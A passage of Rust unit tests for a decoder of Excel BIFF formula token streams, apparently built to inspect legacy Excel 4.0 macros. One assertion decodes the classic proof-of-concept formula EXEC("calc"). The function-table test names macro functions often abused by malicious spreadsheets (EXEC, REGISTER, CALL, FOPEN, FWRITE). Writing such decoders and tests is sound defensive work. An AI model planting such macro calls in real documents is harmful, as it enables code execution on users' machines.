        assert_eq!(decoded.text, "EXEC(\"calc\")");
        assert_eq!(BiffVersion::from_code(0x0500), Some(BiffVersion::Biff5));
        assert_eq!(BiffVersion::from_code(0x0700), Some(BiffVersion::Biff7));
        assert_eq!(BiffVersion::from_code(0x0600), Some(BiffVersion::Biff8));
        assert_eq!(BiffVersion::from_code(0x0400), None);
    }

    #[test]
    fn unsupported_biff5_tokens_are_reported_not_misread() {
        let decoded = decode_with_version(&[0x20, 0, 0, 0, 0, 0, 0, 0, 0], 64 * 1024, BiffVersion::Biff5);
        assert!(!decoded.complete);
    }

    #[test]
    fn an_array_constant_is_rendered_from_its_extra_data() {
        let (mut rgce, extra) = array_constant(2, 1, &[1.0, 2.0]);
        rgce.extend_from_slice(&ptg_func_var(0x0004, 1, false)); // SUM
        let decoded = decode_with_extra(&rgce, &extra, 64 * 1024, BiffVersion::Biff8);
        assert!(decoded.complete, "{decoded:?}");
        assert_eq!(decoded.text, "SUM({1,2})");

        // Two rows keep the row separator.
        let (mut grid, grid_extra) = array_constant(2, 2, &[1.0, 2.0, 3.0, 4.0]);
        grid.extend_from_slice(&ptg_func_var(0x0004, 1, false));
        assert_eq!(
            decode_with_extra(&grid, &grid_extra, 64 * 1024, BiffVersion::Biff8).text,
            "SUM({1,2;3,4})"
        );
    }

    #[test]
    fn an_array_constant_without_extra_data_is_marked_incomplete() {
        let (rgce, _) = array_constant(1, 1, &[1.0]);
        let decoded = decode_with_version(&rgce, 64 * 1024, BiffVersion::Biff8);
        assert!(!decoded.complete);
        assert_eq!(decoded.text, "ARRAY(?)");

        // A truncated extra body must not be misread as a value list.
        let (ok, extra) = array_constant(2, 1, &[1.0, 2.0]);
        let decoded = decode_with_extra(&ok, &extra[..extra.len() - 3], 64 * 1024, BiffVersion::Biff8);
        assert!(!decoded.complete);
    }

    #[test]
    fn memory_tokens_keep_the_reference_expression_they_wrap() {
        // PtgMemArea: ptg + 4 unused bytes + cce, then the expression inline.
        let mut rgce = vec![0x26, 0, 0, 0, 0, 4, 0];
        rgce.extend_from_slice(&[0x24, 0, 0, 0, 0]); // A1
        rgce.extend_from_slice(&ptg_func_var(0x0004, 1, false)); // SUM
        let decoded = decode_with_version(&rgce, 64 * 1024, BiffVersion::Biff8);
        assert!(decoded.complete, "{decoded:?}");
        assert_eq!(decoded.text, "SUM(A1)");

        // PtgMemFunc has only the ptg byte and cce.
        let mut func = vec![0x29, 4, 0];
        func.extend_from_slice(&[0x24, 0, 0, 0, 0]);
        func.extend_from_slice(&ptg_func_var(0x0004, 1, false));
        assert_eq!(
            decode_with_version(&func, 64 * 1024, BiffVersion::Biff8).text,
            "SUM(A1)"
        );

        // A truncated header is reported, never misparsed.
        assert!(!decode_with_version(&[0x26, 0, 0], 64, BiffVersion::Biff8).complete);
        assert!(!decode_with_version(&[0x29, 0], 64, BiffVersion::Biff8).complete);
    }

    #[test]
    fn the_generated_ftab_is_sorted_unique_and_matches_the_spec() {
        assert_eq!(FTAB.len(), 373, "MS-XLS Ftab has 373 entries");
        assert!(FTAB.windows(2).all(|pair| pair[0].0 < pair[1].0));
        assert_eq!(ftab(0x006E), Some(("EXEC", 1)));
        assert_eq!(ftab(0x0095), Some(("REGISTER", 1)));
        assert_eq!(ftab(0x0096), Some(("CALL", 1)));
        assert_eq!(ftab(0x0084), Some(("FOPEN", 1)));
        assert_eq!(ftab(0x008A), Some(("FWRITE", 2)));
        assert_eq!(ftab(0x0036), Some(("HALT", 0)));
        assert_eq!(ftab(0x0037), Some(("RETURN", 0)));
        assert_eq!(ftab(0xFFFF), None);
    }

    #[test]
    fn a_formula_record_carries_the_token_stream() {
        let record = formula_record(&ptg_int(1));
        assert_eq!(&record[0..2], &0x0006u16.to_le_bytes());
        let len = u16::from_le_bytes([record[2], record[3]]) as usize;
        assert_eq!(len, 22 + 3);
        assert_eq!(&record[26..], &[0x1E, 1, 0]);
    }
}
